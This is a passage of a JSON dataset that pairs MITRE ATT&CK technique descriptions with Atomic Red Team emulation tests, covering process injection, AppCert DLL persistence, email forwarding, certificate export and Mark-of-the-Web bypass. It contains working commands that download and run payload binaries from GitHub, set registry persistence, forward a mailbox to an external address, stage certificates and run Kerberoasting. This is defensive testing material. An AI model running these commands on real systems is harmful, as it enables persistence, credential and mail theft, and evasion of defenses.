"external_id": "T1055.004", "data_components": ["Process Modification", "Process Access", "OS API Execution"], "kill_chain_phases": ["defense-evasion", "privilege-escalation"], "data_source_platforms": [], "mitigations": ["course-of-action--90f39ee1-d5a3-4aaa-9f28-3b42815b0d46"], "description": "Adversaries may inject malicious code into processes via the asynchronous procedure call (APC) queue in order to evade process-based defenses as well as possibly elevate privileges. APC injection is a method of executing arbitrary code in the address space of a separate live process. \n\nAPC injection is commonly performed by attaching malicious code to the APC Queue (Citation: Microsoft APC) of a process's thread. Queued APC functions are executed when the thread enters an alterable state.(Citation: Microsoft APC) A handle to an existing victim process is first created with native Windows API calls such as <code>OpenThread</code>. At this point <code>QueueUserAPC</code> can be used to invoke a function (such as <code>LoadLibrayA</code> pointing to a malicious DLL). \n\nA variation of APC injection, dubbed \"Early Bird injection\", involves creating a suspended process in which malicious code can be written and executed before the process' entry point (and potentially subsequent anti-malware hooks) via an APC. (Citation: CyberBit Early Bird Apr 2018) AtomBombing (Citation: ENSIL AtomBombing Oct 2016) is another variation that utilizes APCs to invoke malicious code previously written to the global atom table.(Citation: Microsoft Atom Table)\n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via APC injection may also evade detection from security products since the execution is masked under a legitimate process. ", "atomic_tests": [{"name": "Process Injection via C#", "auto_generated_guid": "611b39b7-e243-4c81-87a4-7145a90358b1", "description": "Process Injection using C#\nreference: https://github.com/pwndizzle/c-sharp-memory-injection\nExcercises Five Techniques\n1. Process injection\n2. ApcInjectionAnyProcess\n3. ApcInjectionNewProcess\n4. IatInjection\n5. ThreadHijack\nUpon successful execution, cmd.exe will execute T1055.exe, which exercises 5 techniques. Output will be via stdout.\n", "supported_platforms": ["windows"], "input_arguments": {"exe_binary": {"description": "Output Binary", "type": "path", "default": "PathToAtomicsFolder\\T1055.004\\bin\\T1055.exe"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "#{exe_binary} must be exist on system.\n", "prereq_command": "if (Test-Path \"#{exe_binary}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"#{exe_binary}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.004/bin/T1055.exe\" -OutFile \"#{exe_binary}\"\n"}], "executor": {"command": "\"#{exe_binary}\"\n", "name": "command_prompt"}}]}, "T1647": {"name": "Plist File Modification", "technique_id": "attack-pattern--7d20fff9-8751-404e-badd-ccd71bda0236", "external_id": "T1647", "data_components": ["File Modification", "Command Execution", "Process Creation"], "kill_chain_phases": ["defense-evasion"], "data_source_platforms": [], "mitigations": ["course-of-action--25dc1ce8-eb55-4333-ae30-a7cb4f5894a1"], "description": "Adversaries may modify property list files (plist files) to enable other malicious activity, while also potentially evading and bypassing system defenses. macOS applications use plist files, such as the <code>info.plist</code> file, to store properties and configuration settings that inform the operating system how to handle the application at runtime. Plist files are structured metadata in key-value pairs formatted in XML based on Apple's Core Foundation DTD. Plist files can be saved in text or binary format.(Citation: fileinfo plist file description) \n\nAdversaries can modify key-value pairs in plist files to influence system behaviors, such as hiding the execution of an application (i.e. [Hidden Window](https://attack.mitre.org/techniques/T1564/003)) or running additional commands for persistence (ex: [Launch Agent](https://attack.mitre.org/techniques/T1543/001)/[Launch Daemon](https://attack.mitre.org/techniques/T1543/004) or [Re-opened Applications](https://attack.mitre.org/techniques/T1547/007)).\n\nFor example, adversaries can add a malicious application path to the `~/Library/Preferences/com.apple.dock.plist` file, which controls apps that appear in the Dock. Adversaries can also modify the <code>LSUIElement</code> key in an application\u2019s <code>info.plist</code> file  to run the app in the background. Adversaries can also insert key-value pairs to insert environment variables, such as <code>LSEnvironment</code>, to enable persistence via [Dynamic Linker Hijacking](https://attack.mitre.org/techniques/T1574/006).(Citation: wardle chp2 persistence)(Citation: eset_osx_flashback)", "atomic_tests": [{"name": "Plist Modification", "auto_generated_guid": "394a538e-09bb-4a4a-95d1-b93cf12682a8", "description": "Modify MacOS plist file in one of two directories\n", "supported_platforms": ["macos"], "executor": {"steps": "1. Modify a .plist in\n\n    /Library/Preferences\n\n    OR\n\n    ~/Library/Preferences\n\n2. Subsequently, follow the steps for adding and running via [Launch Agent](Persistence/Launch_Agent.md)\n", "name": "manual"}}]}, "T1546.009": {"name": "AppCert DLLs", "technique_id": "attack-pattern--7d57b371-10c2-45e5-b3cc-83a8fb380e4c", "external_id": "T1546.009", "data_components": ["Windows Registry Key Modification", "Command Execution", "OS API Execution", "Process Creation", "Module Load"], "kill_chain_phases": ["privilege-escalation", "persistence"], "data_source_platforms": [], "mitigations": ["course-of-action--47e0e9fe-96ce-4f65-8bb1-8be1feacb5db"], "description": "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppCert DLLs loaded into processes. Dynamic-link libraries (DLLs) that are specified in the <code>AppCertDLLs</code> Registry key under <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\</code> are loaded into every process that calls the ubiquitously used application programming interface (API) functions <code>CreateProcess</code>, <code>CreateProcessAsUser</code>, <code>CreateProcessWithLoginW</code>, <code>CreateProcessWithTokenW</code>, or <code>WinExec</code>. (Citation: Elastic Process Injection July 2017)\n\nSimilar to [Process Injection](https://attack.mitre.org/techniques/T1055), this value can be abused to obtain elevated privileges by causing a malicious DLL to be loaded and run in the context of separate processes on the computer. Malicious AppCert DLLs may also provide persistence by continuously being triggered by API activity. ", "atomic_tests": [{"name": "Create registry persistence via AppCert DLL", "auto_generated_guid": "a5ad6104-5bab-4c43-b295-b4c44c7c6b05", "description": "Creates a new 'AtomicTest' value pointing to an AppCert DLL in the AppCertDlls registry key. \nOnce the computer restarted, the DLL will be loaded in multiple processes and write an \n'AtomicTest.txt' file in C:\\Users\\Public\\ to validate that the DLL executed succesfully.\n\nReference: https://skanthak.homepage.t-online.de/appcert.html\n", "supported_platforms": ["windows"], "input_arguments": {"dll_path": {"description": "path of dll to use", "type": "path", "default": "PathToAtomicsFolder\\T1546.009\\bin\\AtomicTest.dll"}, "reboot": {"description": "Set value to $true if you want to automatically reboot the machine", "type": "string", "default": "$false"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "File to copy must exist on disk at specified location (#{dll_path})\n", "prereq_command": "if (Test-Path \"#{dll_path}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"#{dll_path}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.009/bin/AtomicTest.dll\" -OutFile \"#{dll_path}\"\n"}], "executor": {"command": "Copy-Item \"#{dll_path}\" C:\\Users\\Public\\AtomicTest.dll -Force\nreg add \"HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\AppCertDlls\" /v \"AtomicTest\" /t REG_EXPAND_SZ /d \"C:\\Users\\Public\\AtomicTest.dll\" /f\nif(#{reboot}){Restart-Computer} \n", "cleanup_command": "reg delete \"HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\AppCertDlls\" /v \"AtomicTest\" /f\nRemove-Item C:\\Users\\Public\\AtomicTest.dll -Force\nRemove-Item C:\\Users\\Public\\AtomicTest.txt -Force\n", "name": "powershell", "elevation_required": true}}]}, "T1114.003": {"name": "Email Forwarding Rule", "technique_id": "attack-pattern--7d77a07d-02fe-4e88-8bd9-e9c008c01bf0", "external_id": "T1114.003", "data_components": ["Application Log Content", "Command Execution"], "kill_chain_phases": ["collection"], "data_source_platforms": [], "mitigations": ["course-of-action--cc2399fd-3cd3-4319-8d0a-fbd6420cdaf8", "course-of-action--eb88d97c-32f1-40be-80f0-d61a4b0b4b31", "course-of-action--feff9142-e8c2-46f4-842b-bd6fb3d41157"], "description": "Adversaries may setup email forwarding rules to collect sensitive information. Adversaries may abuse email forwarding rules to monitor the activities of a victim, steal information, and further gain intelligence on the victim or the victim\u2019s organization to use as part of further exploits or operations.(Citation: US-CERT TA18-068A 2018) Furthermore, email forwarding rules can allow adversaries to maintain persistent access to victim's emails even after compromised credentials are reset by administrators.(Citation: Pfammatter - Hidden Inbox Rules) Most email clients allow users to create inbox rules for various email functions, including forwarding to a different recipient. These rules may be created through a local email application, a web interface, or by command-line interface. Messages can be forwarded to internal or external recipients, and there are no restrictions limiting the extent of this rule. Administrators may also create forwarding rules for user accounts with the same considerations and outcomes.(Citation: Microsoft Tim McMichael Exchange Mail Forwarding 2)(Citation: Mac Forwarding Rules)\n\nAny user or administrator within the organization (or adversary with valid credentials) can create rules to automatically forward all received messages to another recipient, forward emails to different locations based on the sender, and more. Adversaries may also hide the rule by making use of the Microsoft Messaging API (MAPI) to modify the rule properties, making it hidden and not visible from Outlook, OWA or most Exchange Administration tools.(Citation: Pfammatter - Hidden Inbox Rules)\n\nIn some environments, administrators may be able to enable email forwarding rules that operate organization-wide rather than on individual inboxes. For example, Microsoft Exchange supports transport rules that evaluate all mail an organization receives against user-specified conditions, then performs a user-specified action on mail that adheres to those conditions.(Citation: Microsoft Mail Flow Rules 2023) Adversaries that abuse such features may be able to enable forwarding on all or specific mail an organization receives. ", "atomic_tests": [{"name": "Office365 - Email Forwarding", "auto_generated_guid": "3234117e-151d-4254-9150-3d0bac41e38c", "description": "Creates a new Inbox Rule to forward emails to an external user via the \"ForwardTo\" property of the New-InboxRule Powershell cmdlet.\n", "supported_platforms": ["office-365"], "input_arguments": {"username": {"description": "office-365 username", "type": "string", "default": null}, "password": {"description": "office-365 password", "type": "string", "default": null}, "rule_name": {"description": "email rule name", "type": "string", "default": "Atomic Red Team Email Rule"}, "forwarding_email": {"description": "destination email addresses", "type": "string", "default": "Atomic_Operator@fakeemail.aq"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "ExchangeOnlineManagement PowerShell module must be installed. Your user must also have an Exchange license. \n", "prereq_command": "$RequiredModule = Get-Module -Name ExchangeOnlineManagement -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Connect-ExchangeOnline']) {exit 1} else {exit 0}\n", "get_prereq_command": "Install-Module -Name ExchangeOnlineManagement         \nImport-Module ExchangeOnlineManagement\n"}], "executor": {"command": "$secure_pwd = \"#{password}\" | ConvertTo-SecureString -AsPlainText -Force\n$creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $secure_pwd\nConnect-ExchangeOnline -Credential $creds\nNew-InboxRule -Name \"#{rule_name}\" -ForwardTo \"#{forwarding_email}\"\n", "cleanup_command": "$secure_pwd = \"#{password}\" | ConvertTo-SecureString -AsPlainText -Force\n$creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $secure_pwd\nConnect-ExchangeOnline -Credential $creds\nGet-InboxRule | Where-Object { $_.Name -eq \"#{rule_name}\" | ForEach-Object { Remove-InboxRule -Identity $_.Identity -Force -Confirm:$False }\n", "name": "powershell", "elevation_required": false}}]}, "T1649": {"name": "Steal or Forge Authentication Certificates", "technique_id": "attack-pattern--7de1f7ac-5d0c-4c9c-8873-627202205331", "external_id": "T1649", "data_components": ["Active Directory Credential Request", "Windows Registry Key Access", "Active Directory Object Modification", "Application Log Content", "Logon Session Creation", "Command Execution", "File Access"], "kill_chain_phases": ["credential-access"], "data_source_platforms": [], "mitigations": ["course-of-action--cc2399fd-3cd3-4319-8d0a-fbd6420cdaf8", "course-of-action--e3388c78-2a8d-47c2-8422-c1398b324462", "course-of-action--eb88d97c-32f1-40be-80f0-d61a4b0b4b31", "course-of-action--feff9142-e8c2-46f4-842b-bd6fb3d41157"], "description": "Adversaries may steal or forge certificates used for authentication to access remote systems or resources. Digital certificates are often used to sign and encrypt messages and/or files. Certificates are also used as authentication material. For example, Azure AD device certificates and Active Directory Certificate Services (AD CS) certificates bind to an identity and can be used as credentials for domain accounts.(Citation: O365 Blog Azure AD Device IDs)(Citation: Microsoft AD CS Overview)\n\nAuthentication certificates can be both stolen and forged. For example, AD CS certificates can be stolen from encrypted storage (in the Registry or files)(Citation: APT29 Deep Look at Credential Roaming), misplaced certificate files (i.e. [Unsecured Credentials](https://attack.mitre.org/techniques/T1552)), or directly from the Windows certificate store via various crypto APIs.(Citation: SpecterOps Certified Pre Owned)(Citation: GitHub CertStealer)(Citation: GitHub GhostPack Certificates) With appropriate enrollment rights, users and/or machines within a domain can also request and/or manually renew certificates from enterprise certificate authorities (CA). This enrollment process defines various settings and permissions associated with the certificate. Of note, the certificate\u2019s extended key usage (EKU) values define signing, encryption, and authentication use cases, while the certificate\u2019s subject alternative name (SAN) values define the certificate owner\u2019s alternate names.(Citation: Medium Certified Pre Owned)\n\nAbusing certificates for authentication credentials may enable other behaviors such as [Lateral Movement](https://attack.mitre.org/tactics/TA0008). Certificate-related misconfigurations may also enable opportunities for [Privilege Escalation](https://attack.mitre.org/tactics/TA0004), by way of allowing users to impersonate or assume privileged accounts or permissions via the identities (SANs) associated with a certificate. These abuses may also enable [Persistence](https://attack.mitre.org/tactics/TA0003) via stealing or forging certificates that can be used as [Valid Accounts](https://attack.mitre.org/techniques/T1078) for the duration of the certificate's validity, despite user password resets. Authentication certificates can also be stolen and forged for machine accounts.\n\nAdversaries who have access to root (or subordinate) CA certificate private keys (or mechanisms protecting/managing these keys) may also establish [Persistence](https://attack.mitre.org/tactics/TA0003) by forging arbitrary authentication certificates for the victim domain (known as \u201cgolden\u201d certificates).(Citation: Medium Certified Pre Owned) Adversaries may also target certificates and related services in order to access other forms of credentials, such as [Golden Ticket](https://attack.mitre.org/techniques/T1558/001) ticket-granting tickets (TGT) or NTLM plaintext.(Citation: Medium Certified Pre Owned)", "atomic_tests": [{"name": "Staging Local Certificates via Export-Certificate", "auto_generated_guid": "eb121494-82d1-4148-9e2b-e624e03fbf3d", "description": "Export all user certificates and add to a compressed archive.\n", "supported_platforms": ["windows"], "executor": {"command": "$archive=\"$env:PUBLIC\\T1649\\atomic_certs.zip\"\n$exfilpath=\"$env:PUBLIC\\T1649\\certs\"\nAdd-Type -assembly \"system.io.compression.filesystem\"\nRemove-Item $(split-path $exfilpath) -Recurse -Force -ErrorAction Ignore\nmkdir $exfilpath | Out-Null\nforeach ($cert in (gci Cert:\\CurrentUser\\My)) { Export-Certificate -Cert $cert -FilePath $exfilpath\\$($cert.FriendlyName).cer}\n[io.compression.zipfile]::CreateFromDirectory($exfilpath, $archive)\n", "cleanup_command": "$exfilpath=\"$env:PUBLIC\\T1649\\certs\"\nRemove-Item $(split-path $exfilpath) -Recurse -Force -ErrorAction Ignore\n", "name": "powershell"}}]}, "T1049": {"name": "System Network Connections Discovery", "technique_id": "attack-pattern--7e150503-88e7-4861-866b-ff1ac82c4475", "external_id": "T1049", "data_components": ["Command Execution", "OS API Execution", "Process Creation"], "kill_chain_phases": ["discovery"], "data_source_platforms": [], "mitigations": null, "description": "Adversaries may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network. \n\nAn adversary who gains access to a system that is part of a cloud-based environment may map out Virtual Private Clouds or Virtual Networks in order to determine what systems and services are connected. The actions performed are likely the same types of discovery techniques depending on the operating system, but the resulting information may include details about the networked cloud environment relevant to the adversary's goals. Cloud providers may have different ways in which their virtual networks operate.(Citation: Amazon AWS VPC Guide)(Citation: Microsoft Azure Virtual Network Overview)(Citation: Google VPC Overview) Similarly, adversaries who gain access to network devices may also perform similar discovery activities to gather information about connected systems and services.\n\nUtilities and commands that acquire this information include [netstat](https://attack.mitre.org/software/S0104), \"net use,\" and \"net session\" with [Net](https://attack.mitre.org/software/S0039). In Mac and Linux, [netstat](https://attack.mitre.org/software/S0104) and <code>lsof</code> can be used to list current connections. <code>who -a</code> and <code>w</code> can be used to show which users are currently logged in, similar to \"net session\". Additionally, built-in features native to network devices and [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) may be used (e.g. <code>show ip sockets</code>, <code>show tcp brief</code>).(Citation: US-CERT-TA18-106A)", "atomic_tests": [{"name": "System Network Connections Discovery", "auto_generated_guid": "0940a971-809a-48f1-9c4d-b1d785e96ee5", "description": "Get a listing of network connections.\n\nUpon successful execution, cmd.exe will execute `netstat`, `net use` and `net sessions`. Results will output via stdout.\n", "supported_platforms": ["windows"], "executor": {"command": "netstat\nnet use\nnet sessions\n", "name": "command_prompt"}}, {"name": "System Network Connections Discovery with PowerShell", "auto_generated_guid": "f069f0f1-baad-4831-aa2b-eddac4baac4a", "description": "Get a listing of network connections.\n\nUpon successful execution, powershell.exe will execute `get-NetTCPConnection`. Results will output via stdout.\n", "supported_platforms": ["windows"], "executor": {"command": "Get-NetTCPConnection\n", "name": "powershell"}}, {"name": "System Network Connections Discovery FreeBSD, Linux & MacOS", "auto_generated_guid": "9ae28d3f-190f-4fa0-b023-c7bd3e0eabf2", "description": "Get a listing of network connections.\n\nUpon successful execution, sh will execute `netstat` and `who -a`. Results will output via stdout.\n", "supported_platforms": ["linux", "macos"], "dependency_executor_name": "sh", "dependencies": [{"description": "Check if netstat command exists on the machine\n", "prereq_command": "if [ -x \"$(command -v netstat)\" ]; then exit 0; else exit 1; fi;\n", "get_prereq_command": "echo \"Install netstat on the machine.\"; exit 1;\n"}], "executor": {"command": "netstat\nwho -a\n", "name": "sh"}}, {"name": "System Discovery using SharpView", "auto_generated_guid": "96f974bb-a0da-4d87-a744-ff33e73367e9", "description": "Get a listing of network connections, domains, domain users, and etc.  \nsharpview.exe located in the bin folder, an opensource red-team tool.\nUpon successful execution, cmd.exe will execute sharpview.exe <method>. Results will output via stdout.\n", "supported_platforms": ["windows"], "input_arguments": {"SharpView_url": {"description": "sharpview download URL", "type": "url", "default": "https://github.com/tevora-threat/SharpView/blob/b60456286b41bb055ee7bc2a14d645410cca9b74/Compiled/SharpView.exe?raw=true"}, "SharpView": {"description": "Path of the executable opensource redteam tool used for the performing this atomic.", "type": "path", "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\SharpView.exe"}, "syntax": {"description": "Arguements method used along with SharpView to get listing of network connections, domains, domain users, and etc.", "type": "string", "default": "\"Invoke-ACLScanner\", \"Invoke-Kerberoast\", \"Find-DomainShare\" \n"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Sharpview.exe must exist on disk at specified location (#{SharpView})\n", "prereq_command": "if (Test-Path \"#{SharpView}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"#{SharpView}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest #{SharpView_url} -OutFile \"#{SharpView}\"\n"}], "executor": {"name": "powershell", "elevation_required": true, "command": "$syntaxList = #{syntax}\nforeach ($syntax in $syntaxList) {\n#{SharpView} $syntax -}\n"}}]}, "T1553.005": {"name": "Mark-of-the-Web Bypass", "technique_id": "attack-pattern--7e7c2fba-7cca-486c-9582-4c1bb2851961", "external_id": "T1553.005", "data_components": ["File Metadata", "File Creation"], "kill_chain_phases": ["defense-evasion"], "data_source_platforms": [], "mitigations": ["course-of-action--47e0e9fe-96ce-4f65-8bb1-8be1feacb5db", "course-of-action--eb88d97c-32f1-40be-80f0-d61a4b0b4b31"], "description": "Adversaries may abuse specific file formats to subvert Mark-of-the-Web (MOTW) controls. In Windows, when files are downloaded from the Internet, they are tagged with a hidden NTFS Alternate Data Stream (ADS) named <code>Zone.Identifier</code> with a specific value known as the MOTW.(Citation: Microsoft Zone.Identifier 2020) Files that are tagged with MOTW are protected and cannot perform certain actions. For example, starting in MS Office 10, if a MS Office file has the MOTW, it will open in Protected View. Executables tagged with the MOTW will be processed by Windows Defender SmartScreen that compares files with an allowlist of well-known executables. If the file is not known/trusted, SmartScreen will prevent the execution and warn the user not to run it.(Citation: Beek Use of VHD Dec 2020)(Citation: Outflank MotW 2020)(Citation: Intezer Russian APT Dec 2020)\n\nAdversaries may abuse container files such as compressed/archive (.arj, .gzip) and/or disk image (.iso, .vhd) file formats to deliver malicious payloads that may not be tagged with MOTW. Container files downloaded from the Internet will be marked with MOTW but the files within may not inherit the MOTW after the container files are extracted and/or mounted. MOTW is a NTFS feature and many container files do not support NTFS alternative data streams. After a container file is extracted and/or mounted, the files contained within them may be treated as local files on disk and run without protections.(Citation: Beek Use of VHD Dec 2020)(Citation: Outflank MotW 2020)", "atomic_tests": [{"name": "Mount ISO image", "auto_generated_guid": "002cca30-4778-4891-878a-aaffcfa502fa", "description": "Mounts ISO image downloaded from internet to evade Mark-of-the-Web. Upon successful execution, powershell will download the .iso from the Atomic Red Team repo, and mount the image. The provided sample ISO simply has a Reports shortcut file in it. Reference: https://www.microsoft.com/security/blog/2021/05/27/new-sophisticated-email-based-attack-from-nobelium/\n", "supported_platforms": ["windows"], "input_arguments": {"path_of_iso": {"description": "Path to ISO file", "type": "path", "default": "PathToAtomicsFolder\\T1553.005\\bin\\T1553.005.iso"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "T1553.005.iso must exist on disk at specified location (#{path_of_iso})\n", "prereq_command": "if (Test-Path \"#{path_of_iso}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"#{path_of_iso}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1553.005/bin/T1553.005.iso -OutFile \"#{path_of_iso}\"\n"}], "executor": {"command": "Mount-DiskImage -ImagePath \"#{path_of_iso}\"\n", "cleanup_command": "Dismount-DiskImage -ImagePath \"#{path_of_iso}\" | Out-Null\n", "name": "powershell"}}, {"name": "Mount an ISO image and run executable from the ISO", "auto_generated_guid": "42f22b00-0242-4afc-a61b-0da05041f9cc", "description": "Mounts an ISO image downloaded from internet to evade Mark-of-the-Web and run hello.exe executable from the ISO. \nUpon successful execution, powershell will download the .iso from the Atomic Red Team repo, mount the image, and run the executable from the ISO image that will open command prompt echoing \"Hello, World!\". \nISO provided by:https://twitter.com/mattifestation/status/1398323532988399620 Reference:https://www.microsoft.com/security/blog/2021/05/27/new-sophisticated-email-based-attack-from-nobelium/,  ", "supported_platforms": ["windows"], "input_arguments": {"path_of_iso": {"description": "Path to ISO file", "type": "path", "default": "PathToAtomicsFolder\\T1553.005\\bin\\FeelTheBurn.iso"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "FeelTheBurn.iso must exist on disk at specified location (#{path_of_iso})\n", "prereq_command": "if (Test-Path \"#{path_of_iso}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"#{path_of_iso}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1553.005/bin/FeelTheBurn.iso -OutFile \"#{path_of_iso}\"\n"}], "executor": {"command": "Mount-DiskImage -ImagePath \"#{path_of_iso}\" -StorageType ISO -Access ReadOnly\n$keep = Get-Volume -FileSystemLabel \"TestIso\"\n$driveLetter = ($keep | Get-Volume).DriveLetter\ninvoke-item \"$($driveLetter):\\hello.exe\"\n", "cleanup_command": "Dismount-DiskImage -ImagePath \"#{path_of_iso}\" | Out-Null\nStop-process -name \"hello\" -Force -ErrorAction ignore\n", "name": "powershell"}}, {"name": "Remove the Zone.Identifier alternate data stream", "auto_generated_guid": "64b12afc-18b8-4d3f-9eab-7f6cae7c73f9", "description": "Remove the Zone.Identifier alternate data stream which identifies the file as downloaded from the internet.\nRemoving this allows more freedom in executing scripts in PowerShell and avoids opening files in protected view.\n", "supported_platforms": ["windows"], "input_arguments": {"file_to_download": {"description": "File that will be downloaded to test against.", "type": "url", "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/README.md"}, "file_path": {"description": "File to have the Zone.Identifier removed.", "type": "string", "default": "$env:tmp\\ReadMe.md"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "A test file with the Zone.Identifier attribute must be present.", "prereq_command": "if (Test-Path #{file_path}) { EXIT 0 } else { EXIT 1 }\n", "get_prereq_command": "Invoke-WebRequest #{file_to_download} -OutFile #{file_path}\nSet-Content -Path #{file_path} -Stream Zone.Identifier -Value '[ZoneTransfer]','ZoneId=3'\n"}], "executor": {"command": "Unblock-File -Path #{file_path}\n", "cleanup_command": "Set-Content -Path #{file_path} -Stream Zone.Identifier -Value '[ZoneTransfer]','ZoneId=3'\n", "name": "powershell"}}, {"name": "Execute LNK file from ISO", "auto_generated_guid": "c2587b8d-743d-4985-aa50-c83394eaeb68", "description": "Executes LNK file document.lnk from AllTheThings.iso. Link file executes cmd.exe and rundll32 to in order to load and execute AllTheThingsx64.dll from the ISO which spawns calc.exe.\n", "supported_platforms": ["windows"], "input_arguments": {"path_of_iso": {"description": "Path to ISO file", "type": "path", "default": "PathToAtomicsFolder\\T1553.005\\bin\\AllTheThings.iso"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "AllTheThings.iso must exist on disk at specified location (#{path_of_iso})\n", "prereq_command": "if (Test-Path \"#{path_of_iso}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"#{path_of_iso}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1553.005/bin/AllTheThings.iso -OutFile \"#{path_of_iso}\"\n"}], "executor": {"command": "Mount-DiskImage -ImagePath \"#{path_of_iso}\" -StorageType ISO -Access ReadOnly\n$keep = Get-Volume -FileSystemLabel \"AllTheThings\"\n$driveLetter = ($keep | Get-Volume).DriveLetter\n$instance = [activator]::CreateInstance([type]::GetTypeFromCLSID(\"{c08afd90-f2a1-11d1-8455-00a0c91f3880}\"))\n$instance.Document.Application.ShellExecute($driveLetter+\":\\document.lnk\",\"\",$driveLetter+\":\\\",$null,0)\n", "cleanup_command": "Dismount-DiskImage -ImagePath \"#{path_of_iso}\" | Out-Null\n", "name": "powershell"}}]}, "T1612": {"name": "Build Image on Host", "technique_id": "attack-pattern--800f9819-7007-4540-a520-40e655876800", "external_id": "T1612", "data_components": ["Network Connection Creation", "Network Traffic Content", "Network Traffic Flow", "Image Creation"], "kill_chain_phases": ["defense-evasion"], "data_source_platforms": [], "mitigations": ["course-of-action--1dcaeb21-9348-42ea-950a-f842aaf1ae1f", "course-of-action--86598de0-b347-4928-9eb0-0acbfc21908c", "course-of-action--9bb9e696-bff8-4ae1-9454-961fc7d91d5f", "course-of-action--cc2399fd-3cd3-4319-8d0a-fbd6420cdaf8"], "description": "Adversaries may build a container image directly on a host to bypass defenses that monitor for the retrieval of malicious images from a public registry. A remote <code>build</code> request may be sent to the Docker API that includes a Dockerfile that pulls a vanilla base image, such as alpine, from a public or local registry and then builds a custom image upon it.(Citation: Docker Build Image)\n\nAn adversary may take advantage of that <code>build</code> API to build a custom image on the host that includes malware downloaded from their C2 server, and then they may utilize [Deploy Container](https://attack.mitre.org/techniques/T1610) using that custom image.(Citation: Aqua Build Images on Hosts)(Citation: Aqua Security Cloud Native Threat Report June 2021) If the base image is pulled from a public registry, defenses will likely not detect the image as malicious since it\u2019s a vanilla image. If the base image already resides in a local registry, the pull may be considered even less suspicious since the image is already in the environment. ", "atomic_tests": [{"name": "Build Image On Host", "auto_generated_guid": "2db30061-589d-409b-b125-7b473944f9b3", "description": "Adversaries may build a container image directly on a host to bypass defenses that monitor for the retrieval of malicious images from a public registry. An adversary may take advantage of that build API to build a custom image on the host that includes malware downloaded from their C2 server, and then they then may utilize Deploy Container using that custom image.", "supported_platforms": ["containers"], "dependency_executor_name": "sh", "dependencies": [{"description": "Verify docker is installed.", "prereq_command": "which docker\n", "get_prereq_command": "if [ \"\" == \"`which docker`\" ]; then echo \"Docker Not Found\"; if [ -n \"`which apt-get`\" ]; then sudo apt-get -y install docker ; elif [ -n \"`which yum`\" ]; then sudo yum -y install docker ; fi ; else echo \"Docker installed\"; fi\n"}, {"description": "Verify docker service is running.", "prereq_command": "sudo systemctl status docker  --no-pager\n", "get_prereq_command": "sudo systemctl start docker\n"}], "executor": {"command": "docker build -t t1612  $PathtoAtomicsFolder/T1612/src/\ndocker run --name t1612_container  -d -t t1612\ndocker exec t1612_container ./test.sh", "cleanup_command": "docker stop t1612_container\ndocker rmi -f t1612", "name": "sh"}}]}, "T1055.002": {"name": "Portable Executable Injection", "technique_id": "attack-pattern--806a49c4-970d-43f9-9acc-ac0ee11e6662", "external_id": "T1055.002", "data_components": ["Process Modification", "Process Access", "OS API Execution"], "kill_chain_phases": ["defense-evasion", "privilege-escalation"], "data_source_platforms": [], "mitigations": ["course-of-action--90f39ee1-d5a3-4aaa-9f28-3b42815b0d46"], "description": "Adversaries may inject portable executables (PE) into processes in order to evade process-based defenses as well as possibly elevate privileges. PE injection is a method of executing arbitrary code in the address space of a separate live process. \n\nPE injection is commonly performed by copying code (perhaps without a file on disk) into the virtual address space of the target process before invoking it via a new thread. The write can be performed with native Windows API calls such as <code>VirtualAllocEx</code> and <code>WriteProcessMemory</code>, then invoked with <code>CreateRemoteThread</code> or additional code (ex: shellcode). The displacement of the injected code does introduce the additional requirement for functionality to remap memory references. (Citation: Elastic Process Injection July 2017) \n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via PE injection may also evade detection from security products since the execution is masked under a legitimate process. ", "atomic_tests": [{"name": "Portable Executable Injection", "auto_generated_guid": "578025d5-faa9-4f6d-8390-aae739d503e1", "description": "This test injects a portable executable into a remote Notepad process memory using Portable Executable Injection and base-address relocation techniques. When successful, a message box will appear with the title \"Warning\" and the content \"Atomic Red Team\" after a few seconds.", "supported_platforms": ["windows"], "input_arguments": {"exe_binary": {"description": "PE binary", "type": "path", "default": "PathToAtomicsFolder\\T1055.002\\bin\\RedInjection.exe"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Portable Executable to inject must exist at specified location (#{exe_binary})\n", "prereq_command": "if 